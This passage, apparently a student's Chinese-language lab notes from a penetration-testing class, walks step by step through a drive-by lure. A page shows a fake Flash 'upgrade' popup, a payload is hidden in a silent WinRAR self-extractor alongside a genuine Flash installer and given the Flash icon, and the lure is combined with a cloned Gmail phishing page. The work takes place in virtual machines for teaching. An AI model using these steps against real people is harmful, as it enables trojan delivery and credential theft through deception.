class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将index.html粘贴到C:\phpstudy_pro\WWW的phpstudy的根目录之下,打开phpstudy,点击首页,开启Apache2.4.39,在浏览器输入虚拟键本地IP地址,出现下面结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701258799488-5bd460a7-9400-4349-bea1-150420f08b57.png" alt="image.png"></p><p>在当前的基础上再次编辑index.html,插入一段代码,整体如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./flash.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>luyuguo hello world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下载老师发送的文件flash.js和flash.exe,将其复制到虚拟机之中,对flash.js右键进行编辑在当前位置输入win10hei虚拟机的IP地址<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701259576157-d2649dee-9443-4964-bb9c-a822edb3c6c6.png" alt="image.png"><br>完毕之后将这两个文件放入phpdtudy的根目录下,打开phpstudy,点击首页点击启动Apache,切记在用浏览器查看结果时,应当保证Apache是启动状态。在虚拟机的浏览器中输入127.0.0.1,回车进行查看结果,点击立即升级就会下载flash.exe。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701226960123-a804760a-4245-4652-a83a-cab6e50ae48a.png" alt="image.png"><br>下午:<br>从老师那里下载flag.exe文件,将其复制到win10hei虚拟机的桌面上,再将phpstudy的根目录中的falsh.exe删除，将flag.exe拖到phpstudy的根目录中,重新命名为flash.exe,查看当前虚拟机IP地址是否更改,如果地址发生变化就对flash.js进行改动,，没有就不需要改动,最后在物理机的浏览器上输入当前win10hei虚拟机的ip地址, 出现如下结果。会出现蚊子,点击它们就会消失，点击立即升级就会下载修改好的flash.exe。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701239061245-9078a8ac-d2f1-4c7c-ac90-be0a9914474e.png" alt="image.png"><br>首先需要将flash.exe从phpstudy的根目录中拖出到桌面上,下载老师发的flash中心的安装包flashcenter_pp_install_cn.exe，将其拖入到虚拟机的桌面上,按照老师发的要求下载winrar.zip将其复制到win10hei虚拟机之中,在虚拟机中进行解压,将其解压到桌面上会出现winrar的文件夹,双击打开这个文件夹,找到WinRAR.exe,双击点开,按照这个目录：C:\Users\Administrator\Desktop<br>从而查找到桌面文件,找到flash.exe和flashcenter_pp_install_cn.exe,此时按住ctrl键,依次点击这两个文件,点击左上角的添加,在整个过程中对flash.exe进行了重命名为123.exe。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701261438870-8ee4e0e0-ca2a-48d9-a65c-7bd79860344a.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701261776688-f37c838f-e4f5-4511-8447-c876878bc3ae.png" alt="image.png"><br>高级-&gt;高级自解压选项， 路径设置 C:\windows\Desktop<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701261840136-b728739e-62b3-4e92-bd96-c8aeeb0bea41.png" alt="image.png"><br>设置添加<br>C:\windows\Desktop\flashcenter_pp_install_cn.exe<br>C:\windows\Desktop\flash.exe<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701261908772-492713e9-7ce2-40bd-a7c5-1330eca96c3b.png" alt="image.png"><br>模式设置全部隐藏<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701261970278-ce06e959-1ad2-4172-a52b-764683475bd4.png" alt="image.png"><br>更新设置<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701262011283-77f53c2e-9248-48bd-822b-a5311e1067d8.png" alt="image.png"><br>最后依次点击确定,生成一个tfk.exe的文件,生成之后需要对其图标进行更改,下载两个压缩包Restorator.rar和ResourceHacker.rar,将其解压到win10hei虚拟机的桌面中,此处以Restorator进行演示。点击Restorator的文件夹,找到Restorator.exe,右键以管理员的方式运行,将flashcenter_pp_install_cn.exe和tfk.exe分别拖入其中。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701262496011-0d60ac6c-38c2-4ad9-a5fe-02ef644f63e1.png" alt="image.png"><br>找到flashcenter_pp_install_cn.exe的图标目录将其复制,再将tfk.exe的图标进行删除,粘贴上flashcenter_pp_install_cn.exe的图标,进行保存。然后win10hei虚拟机进行重启,对tfk.exe而言，图标已经发生变化,此时复制tfk.exe将其粘贴到phpstudy的根目录中并且重新命名为flash.exe。<br>此时打开kali linux虚拟机按照昨天钓鱼网站的步骤生成一个简单的钓鱼网站<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701263278609-ceddb207-6580-4aff-b68a-c1029cf49a40.png" alt="image.png"><br>再在kali linux虚拟机的浏览器上面输入127.0.0.1:8080,出现当前页面<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701263397203-591fc679-9677-47aa-b5a7-cb67d313c7bc.png" alt="image.png"><br>首先缩小页面,点击主文件夹,找到下载新建一个html文件夹,打开页面,右键点击保存在html文件夹中,打开html文件夹,将其中的两个文件进行复制将其粘贴到物理机的桌面上。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701264229193-54eec23c-ba2b-41ae-b889-c4eb4f33767b.png" alt="image.png"><br>将这两个文件压缩为一个压缩包html.zip,将其复制粘贴到win10hei虚拟机的桌面上将其解压为html文件夹,复制其中的文件到phpstudy的根目录中,将Gmail.html重命名为index.html,之前的index.html命名为index123.html。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701264650995-3577c452-ddb6-490f-ad88-6b842039dbce.png" alt="image.png"><br>打开当前的index123.html为文本编辑状态,复制其中的一串代码插入到index.html中,代码如下:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./flash.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后分别保存index.html和index123.html于phpstudy的根目录中,打开phpstudy.exe开启Apache服务器,最后在物理机的浏览器输入当前虚拟机win10hei的ip地址192.168.249.133,出现的结果为:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701265025499-38bd9db9-7f7f-4222-97d1-65f1c7efbc45.png" alt="image.png"><br>在GMmail页面的基础出现了一个flash的弹窗,点击立即升级就会下在flash.exe文件打开就会出现蚊子,并显示flash中心的安装弹窗。</p>]]></content>
      
      
      <categories>
          
          <category> tg社工学,制作钓鱼网站,渗透介绍,大灰狼远程工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tg,钓鱼网站,大灰狼远程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
